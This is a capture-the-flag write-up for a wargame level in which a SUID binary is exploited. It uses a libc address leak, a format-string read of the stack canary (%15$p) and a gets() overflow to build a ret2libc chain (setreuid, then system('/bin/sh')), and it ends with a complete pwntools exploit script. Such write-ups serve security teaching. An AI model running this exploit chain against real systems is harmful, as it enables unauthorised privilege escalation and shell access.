# Level09 — Rainfall (neuromancer)

Full ret2libc under **NX + stack canary + ASLR** — the same class as level10, but
the leaks come from different places. Here the libc leak is *handed to you* by the
program, and the canary comes from a format-string bug in a separate function.

```
Vulns:   free libc leak (info_leak) + format-string (canary) + gets() overflow
Defeats: ASLR (leaked puts), canary (leaked via format string), NX (ret2libc)
Goal:    shell as flag09  ->  cat /home/flag09/.pass
```

---

## 1. The binary

`neuromancer` is a SUID binary owned by `flag09`, so when `level09` runs it the
process has **ruid = level09, euid = flag09** — remember that split, it forces the
`setreuid` step later.

Protections that shape the exploit (confirm with `checksec neuromancer`):

```
Canary found     -> can't blindly smash the return address; must leak & replay it
NX enabled       -> no stack shellcode; reuse libc code (ret2libc)
No PIE (0x400000)-> the binary is at a fixed address
ASLR (OS)        -> libc moves every run; that's why a leak exists
```

### Flow (`main`)

```
init_nodes() -> print_banner() -> handle_command()
                                    |
                 info_leak() -> console_handshake() -> process_input()
```

`init_nodes()` just fills a table of 12 `nodes` (40-byte structs) and `show_node()`
only prints them — neither is needed for the exploit. All three useful primitives
live in the chain `info_leak -> console_handshake -> process_input`, and they run
in that order, so **one pass gives us both leaks and then the overflow.**

---

## 2. Vulnerability #1 — free libc leak (`info_leak`)

```c
void info_leak(void) {
    printf("... %p ...", puts);   // prints the RUNTIME address of puts in libc
}
```

In the disassembly it loads the **GOT entry for `puts`** (its resolved libc
address) and prints it. `puts` was already called by `print_banner`, so the GOT
slot holds the real libc address by the time we read it.

That single pointer defeats ASLR:

```python
libc.address = leaked_puts - libc.symbols['puts']
```

No format string is needed for the libc leak — unlike level10, the program volunteers it.

## 3. Vulnerability #2 — format string = canary (`console_handshake`)

```c
void console_handshake(void) {
    char buf[/*0x50*/];
    fgets(buf, 0x40, stdin);   // bounded read — not the overflow
    ...
    printf(buf);               // <-- user-controlled format string
}
```

`printf(buf)` lets us read stack slots with `%p`. We need the **canary** so we can
survive the overflow in the next function (the canary is one per-thread value, so
the one leaked here is the same one checked in `process_input`).

Slot math — `buf` at `rbp-0x50`, canary at `rbp-0x08`. On x86-64, `%6$p` is the
first value on the stack (after the 5 register slots), which is the start of `buf`:

```
%6$p  = [rbp-0x50]  (buf start)
%7$p  = [rbp-0x48]
...
%15$p = [rbp-0x08]  = CANARY
```

So **canary = `%15$p`**. (Confirm by probing `%6$p..%16$p`; the canary is the value
ending in `00`.)

## 4. Vulnerability #3 — `gets()` overflow (`process_input`)

```c
void process_input(void) {
    char buf[/*0x90*/];
    gets(buf);                 // <-- unbounded, the real overflow
    // then: strncmp(buf,"show",5) -> show_node(strtoul(buf+5)), etc.
}
```

`gets()` has no bound, so we overwrite the saved return address. The canary sits
between `buf` and the return address and must be written back correctly.

### Stack layout of `process_input`

```
rbp-0x90  buf[...]           <- gets() writes here
   ...
rbp-0x08  canary
rbp+0x00  saved rbp
rbp+0x08  return address     <- hijack target
```

Padding from `buf` to the canary = `0x90 - 0x08 = 0x88 = 136 bytes`.

Payload:

```
[ 136 bytes padding ][ leaked canary (8) ][ saved rbp (8) ][ ROP chain ]
```

> Note: this `136` is exactly the stale `# offset 136` comment that was floating in
> the level10 script — it belongs to *this* level, not level10 (whose offset is 72).

---

## 5. Why ret2libc, and why `setreuid` first

NX rules out stack shellcode, so we reuse `system("/bin/sh")` in libc. But the
binary is SUID: `euid = flag09`, `ruid = level09`, and dash **drops privileges when
`euid != ruid`** — a bare `system` would hand us a `level09` shell.

Fix: `setreuid(flag09_uid, flag09_uid)` first so `ruid == euid == flag09`, then the
shell keeps the privileges.

```
$ grep flag09 /etc/passwd          # read the uid, e.g. 1026
flag09:x:1026:...                  ->  OWNER_UID = 1026
```

Chain:

```
setreuid(flag09_uid, flag09_uid)   ->   system("/bin/sh")
```

---

## 6. The alignment gotcha (same as level10)

glibc's `system()` runs a `movaps` that needs `rsp` 16-byte aligned. Depending on
how many 8-byte words the chain has, `system` may be entered at the wrong parity
and SIGSEGV *inside* `system` even though everything else is correct.

Fix: add or remove **exactly one** bare `ret` before `system`:

```python
rop.setreuid(OWNER_UID, OWNER_UID)
# rop.raw(rop.ret)      # <-- toggle this single ret if system() crashes on movaps
rop.system(binsh)
```

There are only two parities — if one SIGSEGVs, the other is correct.

---

## 7. Step-by-step recap

1. **libc base** — read `puts` from `info_leak`'s output; `libc.address = leak - libc.sym.puts`; assert page-aligned.
2. **canary** — send `%15$p` to `console_handshake`; parse the value ending in `00`.
3. **chain** — `setreuid(flag09,flag09)` then `system("/bin/sh")`, built on the rebased libc, `badchars=b'\n'`.
4. **align** — toggle one `ret` so `system` enters 16-byte aligned.
5. **overflow** — send `136*b'\x00' + canary + p64(0) + chain` to `process_input`'s `gets()`.
6. **shell** — `cat /home/flag09/.pass`.

---

## 8. Running it

```sh
level09@rainfall:~$ python3 exploit.py
[*] puts@libc = 0x7ffff7c84e50
[*] libc base = 0x7ffff7c00000
[*] canary    = 0x...00
[*] Switching to interactive mode
$ id
uid=1026(flag09) ...
$ cat /home/flag09/.pass
<flag>
```

Flag goes in `level09/flag`; the script in `level09/resources/exploit.py`.

---

## 9. Debugging checklist (symptom -> cause)

| Symptom                                        | Cause                                                      |
|------------------------------------------------|------------------------------------------------------------|
| Script hangs with no output                    | `recvuntil` waiting on a prompt string that doesn't exist — read by regex / `recvrepeat` instead |
| `no libc base` / base not page-aligned         | picked a stack addr, not `puts` — select the leak that rebases page-aligned |
| `no canary … wrong slot`                       | slot shifted — probe `%6$p..%16$p`, take the one ending in `00` |
| SIGSEGV, everything else confirmed             | **stack alignment** — toggle the single `ret`              |
| Shell opens but `cat` says *Permission denied* | wrong `OWNER_UID`, or `setreuid` skipped                   |
| Random ~3% crashes                             | leaked canary contained `0x0a`; `gets` truncated — rerun (fresh ASLR base too) |

---

## 10. Full exploit

```python
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'info'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')   # path from `ldd neuromancer`
OWNER_UID = 1026        # <-- grep flag09 /etc/passwd  and set this

def hexes(b):
    return [int(x, 16) for x in re.findall(rb'0x[0-9a-fA-F]+', b)]

p = process('/home/level09/neuromancer', env={})

# 1. info_leak() prints puts@libc. Pick the leak that gives a page-aligned base.
blob1 = p.recvrepeat(0.5)
for v in hexes(blob1):
    base = v - libc.symbols['puts']
    if base > 0 and base & 0xfff == 0:
        libc.address = base
        puts_leak = v
        break
else:
    raise SystemExit(f"no libc base from {blob1!r}")
log.info("puts@libc = %#x", puts_leak)
log.info("libc base = %#x", libc.address)

# 2. canary via console_handshake format string (%15$p)
p.sendline(b'%15$p')
blob2 = p.recvrepeat(0.5)
canary = next((v for v in hexes(blob2) if v > 0xffffffff and (v & 0xff) == 0), None)
assert canary, f"no canary in {blob2!r} (probe %6$p..%16$p)"
log.info("canary    = %#x", canary)
if b'\x0a' in p64(canary):
    raise SystemExit("canary has a 0x0a byte -> gets() would truncate; rerun")

# 3. ret2libc chain: setreuid(flag09,flag09) -> system("/bin/sh")
rop = ROP(libc, badchars=b'\n')
rop.setreuid(OWNER_UID, OWNER_UID)
# rop.raw(rop.ret)      # add only if system() SIGSEGVs on movaps
rop.system(next(libc.search(b'/bin/sh\x00')))

# 4. overflow process_input via gets(): offset 136
payload = b'\x00' * 136 + p64(canary) + p64(0) + rop.chain()
p.sendline(payload)

p.interactive()
```
